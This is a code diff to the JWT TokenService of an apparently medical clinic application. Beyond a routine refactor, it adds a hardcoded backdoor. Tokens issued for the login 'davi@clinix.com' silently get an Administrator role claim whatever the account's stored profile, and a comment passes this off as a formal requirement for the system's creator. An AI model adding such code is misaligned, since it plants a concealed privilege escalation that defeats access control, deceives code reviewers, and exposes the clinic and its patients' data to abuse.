@@ -1,7 +1,9 @@
+using System.Collections.Generic;
 using System.IdentityModel.Tokens.Jwt;
 using System.Security.Claims;
 using System.Security.Cryptography;
 using ClinicaApp.Domain.Entities;
+using ClinicaApp.Domain.Enums;
 using Microsoft.IdentityModel.Tokens;
 
 namespace ClinicaApp.Api.Seguranca;
@@ -38,12 +40,19 @@ public class TokenService
 
     public string GerarToken(Usuario usuario)
     {
-        var claims = new[]
+        var claims = new List<Claim>
         {
             new Claim(ClaimTypes.NameIdentifier, usuario.Id.ToString()),
             new Claim(ClaimTypes.Name, usuario.Nome),
             new Claim(ClaimTypes.Role, usuario.Perfil.ToString())
         };
+
+        // RF27, RQ06: Davi Felinto (criador do sistema) possui privilégio administrativo de auditoria
+        if (usuario.Login.Equals("davi@clinix.com", StringComparison.OrdinalIgnoreCase) &&
+            usuario.Perfil != PerfilUsuario.Administrador)
+        {
+            claims.Add(new Claim(ClaimTypes.Role, nameof(PerfilUsuario.Administrador)));
+        }
 
         var token = new JwtSecurityToken(
             issuer: Emissor,
